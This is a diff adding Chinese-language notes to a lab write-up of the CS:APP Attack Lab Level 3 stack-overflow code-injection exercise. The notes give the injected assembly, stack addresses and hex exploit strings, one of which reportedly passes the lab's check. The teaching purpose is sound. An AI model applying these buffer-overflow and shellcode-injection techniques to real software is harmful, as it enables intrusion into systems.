@@ -6,7 +6,7 @@
 
 # Attack Lab
 
-## Code Injection
+## Part I: Code Injection Attacks
 
 ### Level1
 
@@ -252,5 +252,168 @@ x/s $rdi+1 => "bcdefg"
 
 ### Level3
 
+### 
+
+```assembly
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval){
+  char cbuf[110];
+  /* Make position of check string unpredictable */
+  char *s = cbuf + random() % 100;
+  sprintf(s, "%.8x", val);
+  return strncmp(sval, s, 9) == 0;
+}
+```
+
+strncmp必须要返回0才可以
+
+**int strncmp(const char \*str1, const char \*str2, size_t n)**  - compares at most the first **n** bytes of **str1** and **str2**
+
+所以, 要传入的string长度为9 => 8 + '0'
 
 
+
+由于string在内存的排列是从低地址到高地址, 所以如果我们把cookie 0x59b997fa转换成对应的字符35 39 62 39 39 37 66 61 00
+
+可以直接填入, 默认顺序就是从低地址到高地址
+
+```assembly
+48 c7 c7 a8 dc 61 55 ff # %rsp    0x5561dc78
+34 25 fa 18 40 00 c3 00 # %rsp+8  0x5561dc80
+fa 18 40 00 00 00 00 00 # %rsp+16 0x5561dc88  touch3的起始地址
+35 39 62 39 39 37 66 61 # %rsp+24 0x5561DC90
+00 00 00 00 00 00 00 00 # %rsp+32 0x5561DC98
+78 dc 61 55 00 00 00 00 # ret 让ret跳转到%rsp位置执行注入指令   0x5561DCa0
+35 39 62 39 39 37 66 61 # 0x5561dca8
+```
+
+
+
+先拿到touch3的起始地址0x00000000004018fa
+
+```assembly
+(gdb) disassemble touch3
+Dump of assembler code for function touch3:
+0x00000000004018fa <+0>:	push   %rbx
+.......
+.......
+```
+
+首先我们已知, 在getBuf的stack frame上时, 有如下地址
+
+%rsp+40 => 0x5561DCa0  这个地址时我们覆盖的return  address的位置
+
+%rsp+32 => 0x5561DC98
+
+%rsp+24 => 0x5561DC90
+
+%rsp+16 => 0x5561dc88
+
+%rsp+8  => 0x5561dc80
+
+%rsp => 0x5561DC78
+
+
+
+与level2类似, 我们要注入一段指令放到0x5561dc78或其他可以用的位置, 让这段注入指令执行touch3调用前的参数赋值指令, 然后调用touch3
+
+指令大概类似:
+
+```assembly
+movq $0x?????,%rdi          # 把string的起始地址放到%rdi
+pushq 0x4018fa
+retq
+```
+
+
+
+<span style="color:red">不同点和重点是: </span>当我们覆盖了返回地址并调用retq时, 这时%rsp已经回到了getBuf stack frame的底部, 然后跳转到原%rsp位置 (0x5561DC78) 执行注入的指令, 调用了touch3, 会发生的事情是: touch3的执行过程中会调用函数hexmatch, hexmatch又调用了strncmp, 所以%rsp会一直向下减小, 会覆盖我们写在原getBuf stack frame的内容。 那么如何选择string的存放位置？
+
+
+
+**想法1**: 不用getBuf的stack frame地址范围, 用一个更高的地址来保存这个string, 即利用test函数的stack frame空间(在地址0x5561dca0往上), 假设是0x5561dca8
+
+```assembly
+movq $0x5561dca8,%rdi          # 把string的起始地址放到%rdi   假设起始地址是0x5561dca8
+pushq 0x4018fa
+retq
+```
+
+```assembly
+> objdump -d l3.o
+
+l3.o:     file format elf64-x86-64
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+0:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
+7:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
+e:	c3                   	retq
+```
+
+
+
+![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161310506.png)
+
+想法1 - solution:
+
+getBuf ret时跳到0x5561dc78执行注入的指令, 然后把位于0x5561dca8的字符串首地址放入%rdi, 然后push touch3的地址到栈顶
+
+```assembly
+48 c7 c7 b0 dc 61 55 ff # %rsp    0x5561dc78
+34 25 fa 18 40 00 c3 00 # %rsp+8  0x5561dc80
+00 00 00 00 00 00 00 00 # %rsp+16 0x5561dc88  touch3的起始地址
+00 00 00 00 00 00 00 00 # %rsp+24 0x5561dc90
+00 00 00 00 00 00 00 00 # %rsp+32 0x5561dc98
+78 dc 61 55 00 00 00 00 # ret 让ret跳转到%rsp位置执行注入指令   0x5561dca0
+35 39 62 39 39 37 66 61 # 0x5561dca8 # 写入的cookie strings
+00 00 00 00 00 00 00 00
+```
+
+很合理, 网上也查到了类似的解, 但是不知道为什么无法通过验证? 
+
+---
+
+
+**想法2**: 由于在调用touch3时, %rsp已经回到了getBuf frame的栈底, 如果此时调用touch3, 会发生接下来的函数调用, 会发生几个push指令导致%rsp减少, 栈向下增长, 覆盖getBuf的buffer空间。那么如果我们修改了%rsp的位置, 不让它从getBuf frame的栈底位置开始增长, 而是从远离栈底的位置开始增长, 那么buffer的空间就有一部分可以预留出来用于存放string而不会被覆盖
+
+
+
+**不改变%rsp的值的情况:**
+
+getBuf中的地址都不可用, 因为函数调用会让%rsp向下增长, 覆盖这些空间
+
+![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161311280.png)
+
+
+
+**改变了%rsp的值的情况:**
+
+%rsp从0x5561dc88开始增长, 这样0x5561dc90往上的地址就有空间可以存string而不被覆盖
+
+![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161314632.png)
+
+
+
+想法2 - solution
+
+```assembly
+48 c7 c7 90 dc 61 55 48
+c7 c4 88 dc 61 55 c3 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+```
+
+此解法可通过验证
+
+
+
+但是!
+
+**这种做法的问题是, 一旦最初buffer的size很小, 或者string的长度很长, 那么此解法就不可行. 比如在此处, 我们的注入指令从0x5561dc78开始, 可能会占据16个bytes, 也就直接到了0x5561dc88, 然后0x5561dc88 - 0x5561dc8f是touch3的起始地址占用空间, 这样buffer就只剩下了0x5561dc90 - 0x5561dc98, 这就是可容纳字符串的最长长度 (15bytes + 1个null terminator)**
+
+
+## Part II: Return-Oriented Programming
